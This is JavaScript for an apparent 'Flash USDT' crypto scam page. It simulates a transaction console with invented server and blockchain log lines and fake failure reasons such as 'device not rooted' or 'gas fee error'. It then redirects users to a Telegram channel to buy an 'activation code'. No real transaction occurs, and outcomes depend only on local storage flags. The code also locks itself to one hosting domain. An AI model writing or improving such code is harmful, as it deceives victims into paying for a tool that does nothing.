      let p = document.createElement('p')
      p.textContent = arr[k]
      displayScreen.appendChild(p)
      k += 1
      console.log(k)
      displayScreen.scrollTop = displayScreen.scrollHeight;
    }
    let interval = setInterval(onlineShow, 1500)
    setTimeout(function() {
      clearInterval(interval)
    }, 15000)
  } else {
    onlinAlert()
    let p = document.createElement('p')
    p.textContent = "[INFO] Connection failed, Please check your internet connection"
    displayScreen.appendChild(p)
  }
}

function warning() {
  let warning = document.getElementById('warning');
  warning.style.display = 'flex';
}

createAnewTransaction.onclick = ()=> {
  removeAllElements()
  if(navigator.onLine) {
   if(payOutInput.value == "") {
    let p = document.createElement('p')
    let y = document.createElement('p')
    p.textContent = "[INFO] Initializing transaction"
    y.textContent = "[INFO] Verfiying parameters"
    displayScreen.appendChild(p)
    displayScreen.appendChild(y)

    setTimeout(function() {
      notificationBody.style.height = "5em"
      notificationContainer.style.display = "flex"
      container.style.pointerEvents =  "none"
      navShowHelp.style.display = "none"
      notificationHeadP.textContent = "Flash USDT"
      notificationBodyP.textContent = "Invaild receiver wallet address, verify and try again"
    }, 2000)
   } else {
    if(amountInput.value == "") {
    let p = document.createElement('p')
    let y = document.createElement('p')
    p.textContent = "[INFO] Initializing transaction"
    y.textContent = "[INFO] Verfiying parameters"
    displayScreen.appendChild(p)
    displayScreen.appendChild(y)


      // timing for different warning


    setTimeout(function() {
      notificationBody.style.height = "5em"
      notificationContainer.style.display = "flex"
      container.style.pointerEvents =  "none"
      navShowHelp.style.display = "none"
      notificationHeadP.textContent = "Flash USDT"
      notificationBodyP.textContent = "Invaild amount, verify and try again"
    }, 2000)
    } else if(localStorage.getItem('activated')) {
      transactionID.innerText = ""
      let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Verifying wallet address...", "[INFO] Fetching transaction details...", "[INFO] Sending from Minning_287.86.35.94-binance-server.com-33-p#", "[INFO] Connecting to Binance Server...",
      `[INFO] Sending ${amountInput.value}`, 
      `[INFO] Sending to ${payOutInput.value}`,
      '[INFO] Confirmn transaction... True',
      '[INFO] Connecting to blockchain server',
      '[INFO] Registrating transaction',
      `[INFO] Sending ${amountInput.value}  to  ${payOutInput.value}`,
      '[INFO] Registrating transaction',
      '[INFO] Verifying transaction',
      '[INFO] Signing transaction details',
      '[INFO] Transaction checked but not signed',
      '[INFO] Redirecting to blockchain network'
   ]
     let k = 0
     function finalActivateShow() {
       let p = document.createElement('p')
       p.textContent = arr[k]
       displayScreen.appendChild(p)
       k += 1
       console.log(k)
       displayScreen.scrollTop = displayScreen.scrollHeight;
     }
     let interval = setInterval(finalActivateShow, 500) ///wait
     setTimeout(function() {
       clearInterval(interval)
     }, 9000)

    

     setTimeout(()=> {
     notificationBodyP.style.textAlign = "left"
     notificationBodyP.style.overflowWrap = "break-word";
     notificationBodyP.style.wordBreak = "break-all";
     notificationBody.style.height = "7em"
     notificationContainer.style.display = "flex"
     container.style.pointerEvents =  "none"
     navShowHelp.style.display = "none"
     let warningCheck = localStorage.getItem('warning')
    if(warningCheck == 'yes') {
      notificationHeadP.textContent = "Flash USDT Blocked"
      notificationBodyP.textContent = 'Transaction Failed, Device is not rooted and is been monitored'
       warning()
    } else if(warningCheck == 'no') {
      notificationHeadP.textContent = "Flash USDT Blocked"
      notificationBodyP.textContent = 'Transaction Failed. Gas fee error'
    } else if(warningCheck == 'balance') {
      notificationBody.style.height = "9em"
      notificationHeadP.textContent = "Flash USDT Blocked"
      notificationBodyP.textContent = 'Account restricted, contact HYPER FLASH support https://t.me/usdtflashcorenetwork'
    } else if(warningCheck == 'sent') {
      // will be adding a code to get transaction info
      notificationHeadP.textContent = "Flash USDT Successful"
      notificationBodyP.textContent = `Transaction Successful. Transaction ID ${txid}`
      // 
    } else {
      notificationHeadP.textContent = "Flash USDT Blocked"
      notificationBodyP.textContent = 'Transaction Failed due to unknown error'
    }
 
     setTimeout(() => {
      // Construct the URL for the explorer page
    //  const explorerUrl = `https://www.blockchain.com/explorer/transactions/btc/${txid}`;
     let localTX = localStorage.getItem('txid')
     transactionID.innerText = `Transaction ID: ${localTX}`
    //  transactionID.innerText = `Transaction ID: ${localTX}`

    // Open the URL in a new tab or window
    // window.open(explorerUrl, '_blank');
    // window.location.href = `https://www.blockchain.com/explorer/transactions/btc/${txid}`
     }, 10000);
     }, 22000)
    }
     else {
      let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Transaction failed, Flash USDT Transaction core is not activated", "[INFO] Sending Bitcoin in demo is disabled in this region", "[INFO] Please activate Flash USDT Transaction Core to continue", "Terminating transaction"]
      let k = 0
      function finalShow() {
        let p = document.createElement('p')
        p.textContent = arr[k]
        displayScreen.appendChild(p)
        k += 1
        console.log(k)
        displayScreen.scrollTop = displayScreen.scrollHeight;
      }
      let interval = setInterval(finalShow, 500)
      setTimeout(function() {
        clearInterval(interval)
      }, 3000)

      setTimeout(() => {
        notificationBody.style.height = "5em"
        notificationContainer.style.display = "flex"
      container.style.pointerEvents =  "none"
      navShowHelp.style.display = "none"
      notificationHeadP.textContent = "Flash USDT"
      notificationBodyP.textContent = "Transaction failed, please activate Flash USDT Transaction Core to continue"
      notificationBodyP.textContent = "Vist https://t.me/usdtflashcorenetwork to buy an activation code"
      setTimeout(() => {
        window.location.href = "https://t.me/usdtflashcorenetwork"
      }, 2000);
      }, 3000);
    }
   } 

  } else {
    let p = document.createElement('p')
    let y = document.createElement('p')
    p.textContent = "[INFO] Initializing transaction"
    y.textContent = "[INFO] Verfiying parameters"
    displayScreen.appendChild(p)
    displayScreen.appendChild(y)
    setTimeout(function() {
      let p = document.createElement('p')
        p.textContent = "[INFO] Connection failed, Please check your internet connection"
        displayScreen.appendChild(p)
    }, 4000)
    setTimeout(onlinAlert, 4000)
  }
}

function removeAllElements() {
  while(displayScreen.firstChild) {
    displayScreen.removeChild(displayScreen.firstChild)
  }
}

function dateFun() {
  let time = new Date()
  // time.toLocaleDateString()
  date.textContent = time.getDate() + "-" + time.getMonth() + "-" + time.getFullYear() + "  " + time.getHours() + ":" + time.getMinutes() + ":" +  time.getSeconds()
}

setInterval(dateFun, 1000)


// /flashbtc/fun.js

// Function to extract OS version from user agent string
function getOSVersion(userAgent) {
  const osRegex = /(Android|iPhone|iPad|Windows Phone|Windows NT|Mac OS X|Linux) ([^;]+)/;
  const match = userAgent.match(osRegex);
  return match ? match[2] : 'Unknown';
}

// Function to get device name based on user agent string
function getDeviceName(userAgent) {
  if (/iPhone/.test(userAgent)) return 'iPhone';
  if (/iPad/.test(userAgent)) return 'iPad';
  if (/Android/.test(userAgent)) return 'Android Device';
  if (/Windows Phone/.test(userAgent)) return 'Windows Phone';
  if (/Windows NT/.test(userAgent)) return 'Windows PC';
  if (/Mac OS X/.test(userAgent)) return 'Mac';
  if (/Linux/.test(userAgent)) return 'Linux';
  return 'Unknown Device';
}

// Get user agent
const userAgent = navigator.userAgent;

// Get OS version and device name
const osVersion = getOSVersion(userAgent);
const deviceName = getDeviceName(userAgent);

// Get device memory information
const deviceMemory = navigator.deviceMemory || 'Unknown';

console.log('Device Name:', deviceName);
console.log('OS Version:', osVersion);
console.log('Device Memory:', deviceMemory, 'GB');

Device.textContent = "Device Name: " + deviceName
osVersions.textContent = osVersion
physicalMemory.textContent = deviceMemory + " GB"


// Get the current host
var currentHost = window.location.host;

// Define the allowed host (your GitHub Pages domain)
var allowedHost = 'hyper-flash-core.github.io';


// Check if the current host is not the allowed host
if (currentHost !== allowedHost) {
    // Redirect to Google
    window.location.href = 'https://www.google.com';
}
